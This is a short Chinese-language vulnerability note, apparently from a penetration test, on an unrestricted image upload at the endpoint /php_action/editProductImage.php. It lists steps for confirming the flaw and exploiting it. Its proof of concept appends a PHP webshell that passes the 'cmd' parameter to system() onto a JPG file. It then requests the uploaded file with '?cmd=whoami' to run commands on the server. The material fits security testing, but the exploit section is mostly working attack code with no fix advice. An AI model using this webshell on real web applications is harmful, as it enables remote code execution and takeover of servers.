验证漏洞存在方法
    - 访问目标系统的 /php_action/editProductImage.php 端点
    - 尝试上传一个包含恶意代码的图像文件（如PHP webshell）
    - 检查是否能够成功上传并访问上传的文件

漏洞利用方法
    - 通过文件上传功能实现远程代码执行
    - 利用步骤：
        1. 准备一个包含PHP代码的图像文件（如将PHP代码嵌入到图像元数据中）
        2. 访问 /php_action/editProductImage.php 端点
        3. 上传特制的图像文件
        4. 如果系统未正确验证文件类型和内容，文件将被上传到服务器
        5. 访问上传的文件路径，执行其中的PHP代码
    - PoC示例：
        ```php
        <?php
        // 创建一个包含PHP webshell的伪造图像文件
        $image_data = file_get_contents('legitimate_image.jpg');
        $php_shell = '<?php system($_GET["cmd"]); ?>';
        
        // 将PHP代码附加到图像数据中
        $malicious_image = $image_data . "\n" . $php_shell;
        
        // 保存为伪造的JPG文件
        file_put_contents('malicious_image.jpg', $malicious_image);
        ?>
        ```
        
        上传后访问：`http://target.com/uploads/malicious_image.jpg?cmd=whoami`
